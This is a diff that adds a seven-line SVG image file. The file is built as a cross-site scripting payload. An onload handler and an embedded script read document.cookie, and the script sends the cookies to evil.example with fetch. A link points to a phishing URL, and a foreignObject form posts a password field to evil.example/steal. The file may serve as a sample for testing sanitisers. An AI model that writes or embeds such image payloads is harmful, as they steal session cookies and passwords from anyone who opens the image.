@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" onload="alert(document.cookie)">
+  <script>fetch('https://evil.example/' + document.cookie)</script>
+  <a xlink:href="https://evil.example/phishing"><circle cx="50" cy="50" r="40" fill="blue"/></a>
+  <foreignObject width="100" height="100">
+    <form xmlns="http://www.w3.org/1999/xhtml" action="https://evil.example/steal"><input name="password"/></form>
+  </foreignObject>
+</svg>
